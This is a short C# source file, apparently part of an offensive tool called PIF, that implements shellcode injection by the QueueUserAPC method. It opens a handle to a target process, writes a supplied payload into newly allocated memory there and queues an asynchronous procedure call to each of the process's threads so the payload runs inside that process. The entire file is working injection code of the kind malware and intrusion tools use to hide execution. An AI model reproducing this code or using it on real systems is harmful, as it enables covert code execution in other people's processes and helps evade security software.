using PIF.Misc;
using System;
using System.Collections.Generic;

namespace PIF.Inject.SC {
    internal class QueueUserAPC {
        public static void Invoke(Init pif) {
            if (pif.targetType != "Process") {
                PIFException.Throw("Provide process name/ID or use 'EarlyBirdAPC' for file path targets.");
            }

            Output.Write("Opening a handle to the target process");
            IntPtr hProcess = Helpers.GetProcessHandle(pif);
            if (hProcess == IntPtr.Zero) {
                PIFException.Throw("Failed to open handle.");
            }

            Output.Write("Allocating new buffer and writing payload into the target process");
            if (!Helpers.AllocAndWriteMemory(hProcess, pif.payloadBytes, out IntPtr hBuffer)) {
                PIFException.Throw($"Failed to {(hBuffer == IntPtr.Zero ? "allocate memory in" : "write to")} target process.");
            }

            Output.Write("Getting all process threads");
            List<IntPtr> hThreads = Helpers.GetProcessThreads(PInvoke.GetProcessId(hProcess));
            foreach (IntPtr thread in hThreads) {
                if (PInvoke.QueueUserAPC(hBuffer, thread, IntPtr.Zero) != 0) {
                    Output.Write($"Queued APC to Thread => 0x{thread.ToInt64():X8}");
                }
            }
        }
    }
}
